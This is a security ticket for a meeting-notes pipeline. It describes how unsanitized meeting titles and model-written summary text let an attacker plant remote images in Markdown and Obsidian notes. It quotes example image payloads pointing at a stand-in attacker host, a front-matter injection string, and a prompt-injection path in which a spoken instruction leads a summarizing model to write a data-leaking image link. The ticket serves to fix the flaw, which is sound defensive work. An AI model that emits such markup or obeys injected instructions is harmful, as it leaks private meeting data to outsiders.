---
id: SEC28
title: Markdown sinks publish model-written text and the meeting title unsanitized, so a spoken instruction or a crafted meeting title plants a remote image that beacons or leaks when the note opens, NDA meetings included
category: Security
status: new
priority: P2
comment: Filed 2026-11-12 ([security review](../../audits/2026-11-12-security-review.md) findings 3, 3b): render_summary_md and the Obsidian template write title, bullets, decisions, tasks, questions and extra sections verbatim; clean_person covers only owner/attendees; apply_meeting_title puts the AX-scraped title in the H1; effective_sinks keeps these sinks under zero-egress; detected_language goes raw into front matter. One shared scrub for every free-text field plus a language-code check. [Spec](./SEC28.md)
---

# SEC28: Markdown sinks publish model-written text and the meeting title unsanitized, so a spoken instruction or a crafted meeting title plants a remote image that beacons or leaks when the note opens, NDA meetings included

Band origin: filed 2026-11-12 from the [2026-11-12 security review](../../audits/2026-11-12-security-review.md), findings 3 and 3b. Status and priority live in this file's header; [INDEX.md](../INDEX.md) lists every task.

## Context

Verified 2026-11-12 by building a `MeetingSummary` from a hostile payload and rendering it in-process through `markdown.render_summary_md` (filesystem and LAN sinks, and the stored `<stem>.summary.md`) and `ObsidianPublisher._render_note`:

- `# ![](https://attacker.example/t.png?q=1)` lands in the H1 of both renderers (`# {s.title}`, `# {title}`); the Obsidian title passes only `_single_line`, which collapses whitespace.
- `![](...)` survives in every list item, `<img src=...>` in decisions, both in extra-section names and items; `ActionItem.task` goes in raw via `_format_action`.
- A newline in a bullet opens a fenced `dataviewjs` code block in both outputs.
- Only attendees and action owners are scrubbed: `prompt_safety.clean_person` is called from the `schemas.py` validators for `owner` and `attendees` and nowhere else. `title`, `summary`, `decisions`, `questions`, `ActionItem.task`, `ExtraSection.name/content` and `detected_language` have no validator, and no defang/escape exists in `mp/` beyond Notion's `_sanitize_option_name` and Obsidian's `_yaml_str`.

**Title path, no model needed.** `publish_router` calls `publish_notion.apply_meeting_title` for every sink, which substitutes `meta.json` `meeting_title[:120]`. Swift fills that from `MeetingTitleResolver` (AX window titles: Zoom topic, the calendar event name in a Meet tab, Webex, Teams); `sanitizeTitle` strips newlines and control characters only. A Zoom host or invite sender who sets the topic to `![](https://attacker/p.png)` gets a request carrying the owner's IP and the note-open time, which reveals that the meeting was recorded.

**Model path.** A participant asks aloud for an image appended to a bullet; a compliant model writes `![](https://attacker/p?d=...)` with data the participant may lack: the AI6 prior-meeting block (see [SEC29](./SEC29.md)), `team_context`, or the part of the meeting after they left. Compliance was not measured; the cloud backend's fence and tool schema resist, local models less so.

**Zero-egress does not cover it.** `config.effective_sinks` drops only `notion` (`[s for s in cfg.output.sinks if s != "notion"]`), so Obsidian, filesystem and LAN still publish on NDA and regulated runs, and the fetch happens in the viewer, outside the pipeline's egress guard. Obsidian loads remote `![](https://...)` and `<img>` by default with no core setting to block them (from Obsidian knowledge, not re-measured). DataviewJS code execution needs the Dataview plugin with JavaScript queries on, which is off by default.

**3b, front matter.** `detected_language` is an unvalidated `str` the model emits on every backend except staged (`summarize_staged` derives it). `publish_obsidian` writes it raw into `language: {language}`; the test value `"en\ncssclasses: evil\ntags: [pwned]"` produced new front-matter keys. TECH-SEC7 hardened the title against exactly this.

Not affected: Notion (`publish_notion._text` builds plain text runs with no link annotation) and the in-app viewer (SwiftUI `Text` does not load images; its link handling is [SEC30](./SEC30.md)).

## Scope

1. **One shared scrub** in `prompt_safety` (seam: a new `clean_text` beside `clean_person`): collapse newlines and control characters to a space, defang `![` (to `!\[`), strip HTML tags, and neutralise `[label](url)` to `label (url)` with the URL wrapped in backticks so no renderer links or loads it. Apply it in `MeetingSummary` validators for `title`, `summary`, `decisions`, `questions`, `ActionItem.task`, `ExtraSection.name` and `ExtraSection.content`, so every backend and every reader (sinks, MCP, digest) gets clean text.
2. **The title override goes through it too:** `apply_meeting_title` scrubs `meeting_title` before substituting it.
3. **`detected_language`** is validated against `^[a-z]{2,3}(-[A-Za-z]{2,4})?$` with fallback `"en"`, in the schema.
4. Sibling, same commit: quote every element of the Obsidian `attendees` list unconditionally (`_yaml_str` leaves `, [ ] { }` bare, so `Bob, Eve` splits into two attendees and `a]` breaks parsing). A robustness bug, not an injection; it lives in the same template.

## Explicitly not

- Blocking the Obsidian/filesystem/LAN sinks under zero-egress: they are the documented on-device destinations; the fix is the content, not the sink. The synced-folder half is [SEC18](./SEC18.md).
- Stripping links the transcript legitimately contains (a URL someone reads out): item 1 keeps the text, it only stops it being a live link or image.
- The AUTO2 `meetingpipe://open` citation links the sinks write on purpose: generated by the renderer, not model text, so unaffected.

## Acceptance

- `test_prompt_safety.py`: `clean_text` table covering `![](x)`, `<img src=x>`, `[a](javascript:x)`, `[a](https://x)`, a newline, and plain text unchanged.
- `test_schemas.py`: a `MeetingSummary` built from the hostile payload (each field above) round-trips with no `![`, no `<`, no live `](`, and no newline in any of them; `detected_language` `"en\ncssclasses: x"` becomes `"en"`.
- Render tests for both `render_summary_md` and the Obsidian note: no remote image, no HTML tag and no extra front-matter key in the output for the hostile payload and for a hostile `meeting_title` through `apply_meeting_title`; an attendee `Bob, Eve` stays one quoted element.
- `cd pipeline && uv run --extra dev pytest -q`, ruff and pyright green with the new test count in the commit body; `bash scripts/ci-local.sh` green.
